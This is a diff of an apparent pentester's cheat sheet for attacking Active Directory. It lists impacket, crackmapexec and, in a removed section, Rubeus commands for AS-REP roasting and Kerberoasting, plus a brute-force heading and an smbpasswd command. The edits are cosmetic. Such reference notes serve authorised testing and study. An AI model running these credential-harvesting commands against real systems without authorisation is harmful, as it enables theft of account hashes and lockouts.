@@ -8,12 +8,12 @@ Check password for userlist:
 
 AS-REP (AS-REP Roasting):
 `impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` 
-`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (need creds)
-`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>` (need creds)
+`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (creds)
+`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>` (creds)
 
 TGS-REP (Kerberoasting):
-`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (need creds)
-`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>` (need creds)
+`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (creds)
+`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>` (creds)
 
 ## NetBIOS & SMB
 Brute force - WILL LOCKOUT USER:
@@ -25,10 +25,3 @@ Check password for userlist:
 
 Change password user:
 `smbpasswd -U <USER> -r <DC_IP>`
-
-## Locally
-AS-REP (AS-REP Roasting):
-`Rubeus.exe asreproast /format:hashcat /nowrap`
-
-TGS-REP (Kerberoasting):
-`setspn -T medin -Q */*`
